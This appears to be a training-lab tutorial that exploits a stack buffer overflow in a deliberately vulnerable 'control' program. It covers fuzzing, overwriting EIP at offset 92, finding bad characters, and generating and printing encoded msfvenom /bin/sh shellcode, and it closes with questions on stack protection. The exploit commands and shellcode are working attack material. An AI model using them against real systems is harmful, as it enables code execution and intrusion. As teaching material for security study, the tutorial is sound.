1. Meet the 'control' program

This is a program of which you will take control in this tutorial.
But first run it and check what it can do. It reads a file called input 
and runs a command from it. 

Create such a file with 

```
python -c 'print("help")' > input
```

Then:


```
make
$ ./control 
	dir - lists the current directory
	cd [folder] - switches the current directory
	end - leave the program
	help - shows this help
```

Try playing with it.

Can you find a problem in it giving it some unusual input?

2. Fuzzing

Providing random output to the program might find weak spots in it. 

Have a look at the fuzz.py program, which generates some output of
a given size. Use it to generate input for the control program.

```
make fuzz
```

See if you can achieve a crash.

How many 'A's were needed to crash the program? Why?

4. Debugging the crash

Let's start investigation why the crash happens. 

```
make debug
```

Let the program run with F9 and supply an input long enough to cause the crash.

What happens to the program?
What is the value of the EIP after the crash?

5. Controlling EIP

We need to find out, which bytes overwrite EIP.

Let's use patter-create tool in Kali for this:

```
pattern_create.rb -l 120
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9
```
This tool generates a sequence, each 4 bytes of which are uniquely 
recognizable.

When the output of this pattern_create.rb is given as a 
command to control, the program stops with EIP 
overwritten with 0x31644130.

Let's paste it to the pattern_offset script to find out the 
place.

```
pattern_offset.rb -q 0x31644130
[*] Exact match at offset 92
```
Now let's replace EIP with BBBB and debug again, in python:
```
>>> print "A" * 92 + "BBBB"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
```

Run the control program, run the debugger as root, attach to 
the process and paste the output.

```
$ ./control 
Press Ctrl+C or type end to quit
Command: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
```

The EIP is overwritten with B's 0x42424242.

6. Finding place for shell code

First we need to know approximately the size of the shellcode to execute.
We will execute shell and use msfvenom to generate a payload for us.
You have to use Kali Linux machine for it.

```
msfvenom -p linux/x86/exec CMD="/bin/sh"
```

This gives us 43 bytes. Which is quite small. If we allocate even more 
space with our buffer overflow, it will be possible to fit the payload there 
after EIP's value.

7. Bad characters

It might be that not every character is processed by the program in the 
same way. Some might get ignored, changed. Some might serve as 
terminators for the input. We have to figure it out before we 
insert the shellcode which might suffer from bad characters.

```
with open("input", "w") as f:
  for i in range (0, 256):
    f.write(chr(i))
```
This will create a file with all characters, let's see how it comes to be.

When we debug with it, we will figure out the bad characters such as 00, 0A, 
and some more. Which?

Answer: 00, 0A, 0D, E8.

Some of them are present in our shellcode originally.


8. Shell code generation

This command generate the right shell code.

```
msfvenom -p linux/x86/exec CMD="/bin/sh"
```

But it has bad characters. Let's use encoder to remove them:

```
msfvenom -p linux/x86/exec CMD="/bin/sh" -e x86/shikata_ga_nai -b "\x00\x0a\x0d\xe8"
```

With --format python we get something like this:

buf =  ""
buf += "\xb8\x08\xf0\xd2\xae\xd9\xc6\xd9\x74\x24\xf4\x5a\x2b"
buf += "\xc9\xb1\x0b\x83\xea\xfc\x31\x42\x11\x03\x42\x11\xe2"
buf += "\xfd\x9a\xd9\xf6\x64\x08\xb8\x6e\xbb\xce\xcd\x88\xab"
buf += "\x3f\xbd\x3e\x2b\x28\x6e\xdd\x42\xc6\xf9\xc2\xc6\xfe"
buf += "\xf2\x04\xe6\xfe\x2d\x67\x8f\x90\x1e\x14\x27\x6d\x36"
buf += "\x89\x3e\x8c\x75\xad"


Let's prepend it with NOPs for everything to work with encoder,
save it to file and debug. The payload has to start in the 
aligned fashion. This can also be achieved by varying NOPs.

See payloadgen.py.

Now we need to substitute the EIP with the address of the payload on the stack.

9. Exploitation

Debug and locate the place of the payload on the stack.

It should be placed instead of B's in the shell code.




x. Additional info and tasks

What if you run the program outside the debugger, does the exploit still work?
Why?

What happens if you compile the program with the stack protector?
Is it still vulnerable? 
Is the graceful crash caused by canaries a problem?

What are other vulnerabilities of the program?
Are they exploitable? Could you exploit them?
Could you fix these vulnerabilities?

What happens if you compile the program without executable 
stack? Does this exploit work? 
Is the program still vulnerable?

































































Hello cheaters :) 

Let's give you some tips here. 

Is the getcwd() call safe? Can it be fixed if no?

What happens if you feed \x00 to the command line?

How about EOF?


